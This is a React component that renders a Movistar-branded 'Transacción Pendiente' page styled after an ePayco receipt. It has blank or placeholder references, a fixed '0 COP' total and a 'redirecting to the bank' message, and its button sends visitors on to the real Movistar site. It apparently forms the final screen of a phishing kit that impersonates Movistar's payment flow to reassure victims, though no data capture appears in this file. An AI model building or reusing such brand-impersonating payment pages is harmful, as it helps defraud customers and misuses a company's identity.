"use client";

import { useState } from "react";
import MovistarHeader from "@/components/MovistarHeader";

function pad(n: number) {
  return String(n).padStart(2, "0");
}

function formattedNow() {
  const d = new Date();
  return `${d.getFullYear()}-${pad(d.getMonth() + 1)}-${pad(d.getDate())} ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
}

export default function FinalizadoClient({ email }: { email: string }) {
  const [loading, setLoading] = useState(false);
  const [formattedDate] = useState(formattedNow);

  function finalizar() {
    setLoading(true);
    window.location.href = "https://www.movistar.com.co/";
  }

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-white">
        <img src="/movistar/M.gif" alt="Cargando" className="w-48" />
      </div>
    );
  }

  return (
    <div>
      <MovistarHeader totalLabel="0" email={email} />
      <div className="my-6">
        <h3 className="text-center text-lg font-semibold">Transacción Pendiente</h3>
        <div className="flex justify-center items-center my-6">
          <img src="/movistar/pausa.png" alt="pausa" className="h-12" />
        </div>
        <div className="w-[90%] mx-auto mt-1">
          {[
            ["Fecha de pago", formattedDate],
            ["Ref Comercio", "..."],
            ["Ref ePayco", ""],
            ["Medio de pago", ""],
            ["Autorización / Cus", ""],
            ["Total", "0 COP"],
          ].map(([label, value], i, arr) => (
            <div
              key={label}
              className={
                "flex justify-between pb-2 mb-2 " +
                (i < arr.length - 1
                  ? "border-b border-b-[#d1d1d1] border-dotted"
                  : "border-dotted")
              }
            >
              <p className="font-medium text-sm">{label}</p>
              <p className="text-sm">{value}</p>
            </div>
          ))}
        </div>
        <div className="text-center text-sm font-medium my-6 text-[#b38f00]">
          <p>La transacción se encuentra en estado PENDIENTE.</p>
          <p>Dentro de 12 a 72 horas se confirmará.</p>
          <p>Redireccionando al banco</p>
        </div>
      </div>
      <button
        onClick={finalizar}
        className="sticky bottom-0 w-full bg-[#40a8e6] flex justify-center items-center gap-1 text-white py-4 shadow-lg hover:bg-[#3098d6] transition-colors duration-300"
      >
        <p className="font-semibold text-lg drop-shadow-sm">Finalizar</p>
      </button>
    </div>
  );
}
